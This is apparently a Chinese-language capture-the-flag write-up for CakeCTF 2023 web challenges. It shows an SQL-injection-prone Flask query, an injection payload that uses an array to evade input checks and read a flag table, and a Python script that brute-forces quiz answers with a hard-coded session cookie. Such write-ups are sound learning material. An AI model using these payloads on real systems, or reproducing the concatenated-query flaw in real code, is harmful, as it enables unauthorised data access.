https://github.com/theoremoon/cakectf2023-public.git
# web
### Country DB
输入简写查询国家全称,
```python
def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
        found = cur.fetchone()
    return None if found is None else found[0]
```
直接拼接,但是code有限制
```python
    if len(code) != 2 or "'" in code:
        flask.abort(400, "Invalid country code")
```
len使用数组绕过,

---
思路是对的,但是没构造出来...下次一定努力
`{"code":["')union select flag from flag;#",""]}`

### TOWFL

脚本题

```python
import requests
import json
header_1={
    "Cookie":"session=.eJwNytENgDAIBcBdmECgtOI2PKCJMxh31_u-h_ouusih7pjFk5cVOC0rY-jByOyAd4vHf3REnMeGmJr4Qu3k0ULvBxoeFSg.ZVY1mQ.E-f62p1xgBmq93T_ddavqQOumro"
}
def getscore()->int:
    req=requests.get("http://towfl.2023.cakectf.com:8888/api/score",headers=header_1)
    result=json.loads(req.content)
    return result['data']['score']

header_2={
    "Cookie":"session=.eJwNytENgDAIBcBdmECgtOI2PKCJMxh31_u-h_ouusih7pjFk5cVOC0rY-jByOyAd4vHf3REnMeGmJr4Qu3k0ULvBxoeFSg.ZVY1mQ.E-f62p1xgBmq93T_ddavqQOumro",
    'Content-Type': 'application/json'
}
def guess_answer():
    
    data=[
    [None, None, None, None, None, None, None, None, None, None],
    [None, None, None, None, None, None, None, None, None, None],
    [None, None, None, None, None, None, None, None, None, None],
    [None, None, None, None, None, None, None, None, None, None],
    [None, None, None, None, None, None, None, None, None, None],
    [None, None, None, None, None, None, None, None, None, None],
    [None, None, None, None, None, None, None, None, None, None],
    [None, None, None, None, None, None, None, None, None, None],
    [None, None, None, None, None, None, None, None, None, None],
    [None, None, None, None, None, None, None, None, None, None]
        ]
    for i in range(10):
        for j in range(10):
            current_score=getscore()
            print(current_score)
            for k in range(4):
                data[i][j]=k
                json_data=json.dumps(data)
                # print(json_data)
                req=requests.post("http://towfl.2023.cakectf.com:8888/api/submit",headers=header_2,data=json_data)
                if getscore()>current_score:
                    break

        print(requests.get("http://towfl.2023.cakectf.com:8888/api/score",headers=header_1).text)

                                 

guess_answer()
```


# reverse



# pwn

# crypto

# Misc


---
# *相关wp*




2023-11-16   23:14